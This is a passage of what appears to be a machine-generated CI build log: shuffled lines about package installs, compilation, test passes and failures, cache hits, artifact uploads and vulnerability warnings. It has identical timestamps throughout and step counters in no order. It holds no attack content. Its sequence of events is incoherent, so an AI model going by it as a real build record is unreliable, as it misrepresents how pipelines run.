key-1758\nInstalling express@3.17.0\n  PASS: test_auth_login (367ms)\nArtifact uploaded: build.tar.gz (29MB)\nCompiling src/app.ts...\n[12:00:32] INFO: Processing request\nStep 9/10: Building\nCache hit for key-5425\nInstalling react@3.0.0\nCompiling src/service.java...\nException: ValueError\nCompiling src/handler.rs...\nInstalling lodash@5.2.0\nArtifact uploaded: build.tar.gz (39MB)\nCache hit for key-3087\nCache hit for key-6392\nCompiling src/app.ts...\nInstalling webpack@5.0.0\nInstalling prettier@5.3.0\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_db_connect (403ms)\nInstalling lodash@4.13.0\nCache hit for key-4856\n[12:00:32] INFO: Processing request\nFAILED: test_db_connect\nCompiling src/app.ts...\nCache hit for key-2050\nCache hit for key-1380\n[12:00:32] INFO: Processing request\n\u2713 lint completed\nStep 2/10: Building\nCompiling src/app.ts...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\n[12:00:32] INFO: Processing request\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\nCache hit for key-2093\nInstalling webpack@5.16.0\nCache hit for key-3149\nInstalling react@4.9.0\nCache hit for key-2216\nWARNING: axios has known vulnerabilities\nCache hit for key-8449\n[12:00:32] INFO: Processing request\nCache hit for key-6908\n  PASS: test_auth_login (23ms)\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 3/10: Building\nCache hit for key-2522\n\u2713 build completed\nStep 4/10: Building\nStep 2/10: Building\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/index.js...\nInstalling jest@4.12.0\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (19MB)\nWARNING: eslint has known vulnerabilities\nStep 4/10: Building\n[12:00:32] WARN: Deprecated API usage\n  PASS: test_user_create (244ms)\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\n\u2713 test completed\nInstalling lodash@2.5.0\nStep 9/10: Building\n\u2713 build completed\nCache hit for key-1528\nCompiling src/main.py...\nStep 8/10: Building\nStep 2/10: Building\nStep 10/10: Building\nCache hit for key-1440\n[12:00:32] INFO: Processing request\nInstalling jest@4.16.0\nFAILED: test_user_create\n\u2713 lint completed\nStep 6/10: Building\nInstalling lodash@1.20.0\n=== Step type_check completed ===\n=== Step: lint ===\nStep 7/10: Building\n  PASS: test_db_connect (132ms)\nWARNING: jest has known vulnerabilities\nCompiling src/utils.go...\nStep 3/10: Building\nInstalling react@4.8.0\nInstalling react@1.15.0\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\nInstalling lodash@1.20.0\n  PASS: test_user_create (125ms)\nStep 9/10: Building\nStep 8/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (45MB)\nInstalling react@2.7.0\nStep 3/10: Building\nInstalling react@1.18.0\nArtifact uploaded: build.tar.gz (41MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:32] WARN: Deprecated API usage\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nInstalling webpack@2.13.0\n[12:00:32] ERROR: Connection failed\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (254ms)\nStep 8/10: Building\nCompiling src/index.js...\n[12:00:32] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (6MB)\nWARNING: jest has known vulnerabilities\nCache hit for key-2877\nStep 5/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:32] ERROR: Connection failed\nInstalling jest@5.20.0\n  PASS: test_auth_login (56ms)\nCompiling src/utils.go...\nWARNING: jest has known vulnerabilities\n  PASS: test_cache_hit (138ms)\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (10MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/app.ts...\n  PASS: test_user_create (405ms)\nStep 5/10: Building\nStep 9/10: Building\n[12:00:32] WARN: Deprecated API usage\n\u2713 lint completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 lint completed\nCache hit for key-5998\nCache hit for key-6814\nWARNING: eslint has known vulnerabilities\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-1399\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (24MB)\nStep 7/10: Building\nStep 5/10: Building\n\u2713 test completed\n\u2713 build completed\nCompiling src/app.ts...\n[12:00:32] WARN: Deprecated API usage\nStep 2/10: Building\n\u2713 test completed\n[12:00:32] INFO: Processing request\nCache hit for key-7331\nArtifact uploaded: build.tar.gz (30MB)\nInstalling lodash@1.10.0\nInstalling jest@2.1.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-7458\n\u2713 test completed\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling webpack@5.17.0\n\u2713 test completed\n[12:00:32] WARN: Deprecated API usage\n\u2713 test completed\nInstalling express@5.16.0\nInstalling react@4.11.0\n  PASS: test_db_connect (416ms)\nStep 4/10: Building\nWARNING: prettier has known vulnerabilities\nStep 3/10: Building\nWARNING: jest has known vulnerabilities\nStep 5/10: Building\n[12:00:32] ERROR: Connection failed\nCompiling src/index.js...\nWARNING: axios has known vulnerabilities\nWARNING: express has known vulnerabilities\n  PASS: test_api_health (499ms)\n[12:00:32] INFO: Processing request\nCompiling src/main.py...\nCompiling src/app.ts...\n  PASS: test_db_connect (98ms)\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/service.java...\nInstalling jest@3.15.0\nWARNING: lodash has known vulnerabilities\n[12:00:32] INFO: Processing request\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (12MB)\nInstalling lodash@3.4.0\nInstalling lodash@2.20.0\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:32] INFO: Processing request\n  PASS: test_user_create (475ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\nStep 7/10: Building\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCache hit for key-2570\nCompiling src/index.js...\nStep 5/10: Building\nInstalling eslint@5.20.0\nInstalling lodash@3.8.0\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_auth_login (333ms)\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-8705\n  PASS: test_cache_hit (111ms)\n  PASS: test_cache_hit (394ms)\nStep 8/10: Building\nCache hit for key-1345\nInstalling jest@2.12.0\nCache hit for key-7631\n\u2713 test completed\nArtifact uploaded: build.tar.gz (19MB)\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (46MB)\n[12:00:32] INFO: Processing request\nStep 1/10: Building\n  PASS: test_api_health (99ms)\n[12:00:32] INFO: Processing request\nCompiling src/handler.rs...\n  PASS: test_db_connect (419ms)\nStep 5/10: Building\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nStep 8/10: Building\n\u2713 test completed\n  PASS: test_db_connect (456ms)\n[12:00:32] INFO: Processing request\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\nInstalling lodash@1.0.0\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-3154\n  PASS: test_cache_hit (267ms)\nStep 6/10: Building\nInstalling jest@2.14.0\nCache hit for key-6193\nCompiling src/service.java...\nCompiling src/app.ts...\nInstalling jest@2.18.0\nInstalling jest@5.10.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 6/10: Building\n  PASS: test_api_health (118ms)\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: test_user_create (11ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling prettier@5.8.0\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_db_connect (321ms)\nStep 6/10: Building\nInstalling axios@2.2.0\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 lint completed\nInstalling eslint@4.0.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 8/10: Building\n\u2713 test completed\nInstalling eslint@4.14.0\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_cache_hit (147ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 build completed\n\u2713 lint completed\nCompiling src/utils.go...\n[12:00:32] INFO: Processing request\n  PASS: test_auth_login (401ms)\n[12:00:32] INFO: Processing request\n  PASS: test_api_health (195ms)\nStep 2/10: Building\n[12:00:32] INFO: Processing request\n=== Step lint completed ===\n=== Step: restore_cache ===\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/main.py...\nStep 9/10: Building\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 test completed\nInstalling webpack@1.2.0\n\u2713 test completed\n[12:00:32] ERROR: Connection failed\nInstalling express@1.11.0\n[12:00:32] INFO: Processing request\n[12:00:32] WARN: Deprecated API usage\nInstalling lodash@3.20.0\nCompiling src/utils.go...\nCache hit for key-9314\nCache hit for key-1317\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 lint completed\n[12:00:32] INFO: Processing request\n\u2713 build completed\n[12:00:32] WARN: Deprecated API usage\nInstalling express@1.12.0\n[12:00:32] INFO: Processing request\nCache hit for key-8380\n  PASS: test_auth_login (341ms)\nInstalling webpack@5.14.0\n  PASS: test_api_health (376ms)\nInstalling lodash@3.8.0\n  PASS: test_user_create (97ms)\n[12:00:32] INFO: Processing request\n  PASS: test_api_health (406ms)\nCompiling src/main.py...\n\u2713 build completed\n[12:00:32] INFO: Processing request\nCache hit for key-4853\nException: ValueError\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_auth_login (446ms)\n\u2713 build completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_user_create (447ms)\n  PASS: test_user_create (401ms)\nCache hit for key-6230\nArtifact uploaded: build.tar.gz (11MB)\nStep 10/10: Building\nCache hit for key-8873\nStep 9/10: Building\n\u2713 test completed\nCache hit for key-9748\nWARNING: eslint has known vulnerabilities\nCompiling src/utils.go...\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:32] INFO: Processing request\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-5482\n  PASS: test_db_connect (29ms)\nCompiling src/index.js...\n[12:00:32] INFO: Processing request\n  PASS: test_db_connect (108ms)\nArtifact uploaded: build.tar.gz (19MB)\n  PASS: test_auth_login (472ms)\nCompiling src/index.js...\nInstalling eslint@1.20.0\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nInstalling axios@2.3.0\nArtifact uploaded: build.tar.gz (42MB)\nCompiling src/app.ts...\nCompiling src/handler.rs...\nCompiling src/index.js...\n[12:00:32] WARN: Deprecated API usage\nInstalling jest@4.16.0\nStep 4/10: Building\nCache hit for key-7660\nCache hit for key-6657\n  PASS: test_db_connect (39ms)\n  PASS: test_auth_login (101ms)\n  PASS: test_db_connect (34ms)\nWARNING: prettier has known vulnerabilities\nCompiling src/main.py...\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-1482\nInstalling lodash@3.5.0\nCompiling src/handler.rs...\n  PASS: test_api_health (263ms)\n  PASS: test_auth_login (86ms)\nCache hit for key-7411\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\n[12:00:32] INFO: Processing request\n\u2717 build failed with exit code 53\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nWARNING: webpack has known vulnerabilities\nStep 7/10: Building\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\nStep 4/10: Building\nCompiling src/service.java...\nCompiling src/utils.go...\n  PASS: test_cache_hit (121ms)\n  PASS: test_user_create (181ms)\nInstalling react@5.14.0\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_auth_login (76ms)\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n  PASS: test_auth_login (342ms)\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_cache_hit (81ms)\nArtifact uploaded: build.tar.gz (12MB)\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nCompiling src/handler.rs...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-9313\nStep 6/10: Building\n\u2713 build completed\nCompiling src/index.js...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (20MB)\nWARNING: prettier has known vulnerabilities\nCompiling src/utils.go...\nCompiling src/handler.rs...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (36MB)\nWARNING: axios has known vulnerabilities\n\u2713 test completed\nArtifact uploaded: build.tar.gz (8MB)\nFAILED: test_db_connect\nInstalling express@2.0.0\nStep 7/10: Building\nCompiling src/index.js...\nException: TypeError\nCache hit for key-9263\nCache hit for key-9049\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n[12:00:32] ERROR: Connection failed\nCache hit for key-5518\n  PASS: test_auth_login (445ms)\nWARNING: webpack has known vulnerabilities\n\u2713 lint completed\n[12:00:32] INFO: Processing request\n  PASS: test_user_create (240ms)\n  PASS: test_user_create (9ms)\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: lodash has known vulnerabilities\n[12:00:32] INFO: Processing request\nCache hit for key-8938\n\u2713 build completed\nArtifact uploaded: build.tar.gz (48MB)\nInstalling axios@3.3.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/app.ts...\nCache hit for key-3942\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (19MB)\nStep 1/10: Building\nCompiling src/app.ts...\nInstalling eslint@3.9.0\nArtifact uploaded: build.tar.gz (35MB)\n\u2713 test completed\nCache hit for key-6455\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 build completed\nStep 6/10: Building\nCompiling src/main.py...\n[12:00:32] INFO: Processing request\nCache hit for key-7768\n  PASS: test_auth_login (454ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (34MB)\nInstalling lodash@5.5.0\nCache hit for key-8645\nStep 7/10: Building\nCompiling src/app.ts...\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nStep 10/10: Building\nCache hit for key-2920\nCache hit for key-6666\n[12:00:32] INFO: Processing request\nStep 8/10: Building\nStep 8/10: Building\n  PASS: test_api_health (88ms)\nStep 5/10: Building\nInstalling lodash@2.9.0\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/app.ts...\nCache hit for key-6142\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:32] WARN: Deprecated API usage\n=== Step restore_cache completed ===\n=== Step: integration_tests ===\nStep 4/10: Building\n[12:00:32] INFO: Processing request\nCache hit for key-4492\nStep 4/10: Building\nException: TypeError\nCompiling src/index.js...\nCompiling src/main.py...\n[12:00:32] INFO: Processing request\n\u2713 lint completed\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (38MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (32MB)\nInstalling axios@5.19.0\n[12:00:32] INFO: Processing request\nCache hit for key-7546\nStep 5/10: Building\n\u2713 lint completed\nInstalling lodash@5.10.0\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_cache_hit (324ms)\nInstalling express@5.15.0\n[12:00:32] ERROR: Connection failed\n\u2713 lint completed\n  PASS: test_api_health (111ms)\n  PASS: test_cache_hit (164ms)\nInstalling prettier@4.10.0\nCache hit for key-7868\nCompiling src/handler.rs...\n  PASS: test_api_health (252ms)\n[12:00:32] ERROR: Connection failed\nInstalling jest@1.6.0\n  PASS: test_cache_hit (43ms)\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling eslint@2.1.0\nCache hit for key-9736\n  PASS: test_user_create (266ms)\nInstalling eslint@3.18.0\nCompiling src/index.js...\nStep 3/10: Building\n\u2713 lint completed\nStep 4/10: Building\nInstalling lodash@1.15.0\nStep 2/10: Building\nStep 4/10: Building\nCache hit for key-5038\nCompiling src/main.py...\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling webpack@5.2.0\n[12:00:32] WARN: Deprecated API usage\n  PASS: test_cache_hit (377ms)\nInstalling lodash@1.2.0\nWARNING: prettier has known vulnerabilities\nStep 2/10: Building\nCompiling src/app.ts...\n  PASS: test_db_connect (106ms)\n  PASS: test_auth_login (21ms)\n[12:00:32] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nWARNING: axios has known vulnerabilities\n  PASS: test_auth_login (87ms)\nCache hit for key-8657\n\u2713 test completed\n\u2713 build completed\n  PASS: test_cache_hit (486ms)\nStep 7/10: Building\nInstalling react@3.7.0\nCompiling src/index.js...\n\u2713 build completed\nStep 9/10: Building\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-9097\n\u2713 test completed\nCache hit for key-2023\nWARNING: express has known vulnerabilities\nStep 6/10: Building\nStep 5/10: Building\nInstalling prettier@5.7.0\n[12:00:32] INFO: Processing request\nInstalling prettier@1.20.0\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:32] INFO: Processing request\n  PASS: test_api_health (78ms)\nCache hit for key-6660\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_cache_hit (390ms)\nCompiling src/service.java...\nCompiling src/main.py...\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (48MB)\nStep 3/10: Building\n[12:00:32] INFO: Processing request\n[12:00:32] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_user_create (304ms)\nArtifact uploaded: build.tar.gz (6MB)\nInstalling prettier@1.10.0\nStep 7/10: Building\nCache hit for key-1944\nCompiling src/service.java...\nCache hit for key-8564\n[12:00:32] INFO: Processing request\n\u2713 test completed\nFAILED: test_user_create\nCompiling src/main.py...\n\u2713 lint completed\n  PASS: test_db_connect (445ms)\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_auth_login (391ms)\nStep 3/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/service.java...\n\u2713 lint completed\nStep 1/10: Building\n[12:00:32] INFO: Processing request\nCache hit for key-6446\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:32] WARN: Deprecated API usage\n  PASS: test_api_health (269ms)\nCache hit for key-7998\n\u2713 lint completed\nCache hit for key-6979\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/index.js...\nStep 7/10: Building\nStep 1/10: Building\nCache hit for key-8895\n\u2713 build completed\n[12:00:32] INFO: Processing request\n  PASS: test_api_health (105ms)\nCompiling src/main.py...\nCompiling src/index.js...\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nFAILED: test_user_create\n  PASS: test_auth_login (181ms)\n\u2713 lint completed\n\u2713 build completed\nFAILED: test_auth_login\n  PASS: test_auth_login (102ms)\nWARNING: react has known vulnerabilities\nStep 2/10: Building\n\u2713 build completed\nCompiling src/app.ts...\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:32] INFO: Processing request\nFAILED: test_user_create\nInstalling express@2.5.0\nCompiling src/app.ts...\nInstalling express@5.5.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (1MB)\nInstalling express@1.20.0\n[12:00:32] INFO: Processing request\nInstalling eslint@3.2.0\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nStep 1/10: Building\nCompiling src/utils.go...\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (279ms)\nStep 3/10: Building\n[12:00:32] INFO: Processing request\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/index.js...\nFAILED: test_api_health\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-9471\nCache hit for key-4333\n  PASS: test_db_connect (275ms)\n[12:00:32] INFO: Processing request\n\u2713 lint completed\nCompiling src/utils.go...\n  PASS: test_api_health (231ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (11MB)\nInstalling jest@5.20.0\nStep 10/10: Building\n[12:00:32] WARN: Deprecated API usage\nInstalling express@3.6.0\n  PASS: test_db_connect (463ms)\n[12:00:32] INFO: Processing request\nCompiling src/index.js...\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (55ms)\n[12:00:32] INFO: Processing request\nInstalling jest@4.15.0\n\u2713 test completed\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_api_health (408ms)\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 build completed\nStep 8/10: Building\n=== Step integration_tests completed ===\n=== Step: setup_environment ===\nStep 1/10: Building\n[12:00:32] WARN: Deprecated API usage\nInstalling axios@3.11.0\n  PASS: test_api_health (433ms)\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_cache_hit (253ms)\nInstalling express@5.2.0\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/service.java...\nStep 7/10: Building\nInstalling webpack@1.20.0\nCache hit for key-5673\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-4667\nCache hit for key-7010\n\u2713 test completed\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:32] WARN: Deprecated API usage\nStep 2/10: Building\nInstalling prettier@2.14.0\nInstalling express@1.12.0\nFAILED: test_db_connect\nStep 7/10: Building\n  PASS: test_api_health (307ms)\nCache hit for key-1642\n[12:00:32] INFO: Processing request\n[12:00:32] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-1698\nCache hit for key-3860\n\u2713 test completed\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/app.ts...\nInstalling express@2.3.0\n[12:00:32] WARN: Deprecated API usage\nCompiling src/handler.rs...\n\u2717 build failed with exit code 39\n[12:00:32] WARN: Deprecated API usage\n  PASS: test_db_connect (34ms)\n  PASS: test_auth_login (475ms)\nCache hit for key-6321\nCache hit for key-8328\nInstalling express@5.10.0\nCompiling src/handler.rs...\n\u2713 lint completed\n[12:00:32] INFO: Processing request\nCache hit for key-5650\n\u2713 build completed\n[12:00:32] ERROR: Connection failed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-7458\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nInstalling react@4.9.0\nWARNING: react has known vulnerabilities\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nFAILED: test_api_health\nWARNING: webpack has known vulnerabilities\nStep 6/10: Building\n\u2713 build completed\nException: RuntimeError\n  PASS: test_cache_hit (209ms)\nStep 6/10: Building\nCompiling src/main.py...\n[12:00:32] ERROR: Connection failed\nStep 1/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_db_connect (198ms)\n\u2713 lint completed\n  PASS: test_user_create (66ms)\nCompiling src/service.java...\n  PASS: test_cache_hit (256ms)\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\nCompiling src/index.js...\nInstalling webpack@2.17.0\nInstalling axios@4.1.0\n\u2713 build completed\nCompiling src/utils.go...\n\u2713 test completed\nStep 5/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (43MB)\nStep 7/10: Building\nCache hit for key-5175\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:32] INFO: Processing request\nStep 5/10: Building\n[12:00:32] INFO: Processing request\n  PASS: test_cache_hit (326ms)\n  PASS: test_cache_hit (491ms)\nInstalling react@2.10.0\n[12:00:32] WARN: Deprecated API usage\nStep 1/10: Building\nInstalling jest@1.18.0\nInstalling axios@1.11.0\nInstalling eslint@3.1.0\nInstalling express@4.15.0\n  PASS: test_api_health (84ms)\n\u2713 test completed\nInstalling prettier@4.18.0\nStep 8/10: Building\nCache hit for key-1654\n\u2713 lint completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (18MB)\nCache hit for key-9604\n[12:00:32] INFO: Processing request\nCache hit for key-5037\nCache hit for key-9531\n  PASS: test_api_health (70ms)\nInstalling webpack@3.0.0\n  PASS: test_user_create (21ms)\nCompiling src/service.java...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (15MB)\nInstalling prettier@4.6.0\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/index.js...\n  PASS: test_cache_hit (16ms)\nStep 6/10: Building\nCompiling src/app.ts...\n[12:00:32] INFO: Processing request\nCompiling src/app.ts...\n[12:00:32] INFO: Processing request\nStep 4/10: Building\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:32] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-8725\n\u2717 build failed with exit code 103\nCache hit for key-2001\nArtifact uploaded: build.tar.gz (8MB)\nInstalling express@3.12.0\nArtifact uploaded: build.tar.gz (6MB)\nStep 9/10: Building\n[12:00:32] INFO: Processing request\nCache hit for key-2660\n[12:00:32] INFO: Processing request\nCompiling src/app.ts...\nStep 4/10: Building\n  PASS: test_api_health (183ms)\n  PASS: test_api_health (410ms)\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 lint completed\n  PASS: test_user_create (166ms)\nInstalling lodash@2.9.0\n[12:00:32] ERROR: Connection failed\n\u2713 build completed\nInstalling webpack@4.15.0\n\u2713 build completed\nCache hit for key-1309\nCompiling src/app.ts...\n\u2713 lint completed\nWARNING: webpack has known vulnerabilities\n[12:00:32] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-4216\nCache hit for key-3066\nCompiling src/service.java...\nCompiling src/service.java...\n\u2713 lint completed\nFAILED: test_api_health\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:32] INFO: Processing request\n  PASS: test_db_connect (215ms)\n\u2717 build failed with exit code 125\n  PASS: test_db_connect (328ms)\n[12:00:32] WARN: Deprecated API usage\nCache hit for key-3809\n  PASS: test_auth_login (233ms)\nCache hit for key-4097\nCache hit for key-5233\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/service.java...\n[12:00:32] ERROR: Connection failed\nCache hit for key-2506\n\u2713 lint completed\nInstalling jest@4.17.0\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:32] ERROR: Connection failed\n\u2713 lint completed\nCompiling src/service.java...\nStep 1/10: Building\n[12:00:32] INFO: Processing request\n[12:00:32] INFO: Processing request\nStep 9/10: Building\nInstalling eslint@5.8.0\n\u2713 lint completed\n\u2717 build failed with exit code 69\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nCache hit for key-8794\n\u2713 test completed\n\u2713 lint completed\n  PASS: test_user_create (79ms)\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\nCache hit for key-3562\n  PASS: test_auth_login (7ms)\nCache hit for key-2163\nCache hit for key-5350\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_api_health (448ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-5822\nArtifact uploaded: build.tar.gz (3MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-6967\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/service.java...\nCache hit for key-4565\nCompiling src/handler.rs...\n  PASS: test_user_create (145ms)\nCache hit for key-4110\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_user_create (383ms)\n\u2713 test completed\nCompiling src/service.java...\n[12:00:32] INFO: Processing request\nInstalling jest@5.8.0\n[12:00:32] ERROR: Connection failed\nStep 9/10: Building\n\u2713 test completed\n[12:00:32] WARN: Deprecated API usage\nCompiling src/app.ts...\nInstalling prettier@3.4.0\nCache hit for key-9769\nInstalling axios@5.11.0\nWARNING: express has known vulnerabilities\n\u2713 lint completed\nCache hit for key-5510\n[12:00:32] INFO: Processing request\nStep 10/10: Building\nStep 7/10: Building\nStep 9/10: Building\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-5825\nCompiling src/handler.rs...\n\u2713 test completed\nInstalling lodash@2.13.0\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (3MB)\nStep 9/10: Building\nCache hit for key-4136\n\u26a0 DEPRECATION: 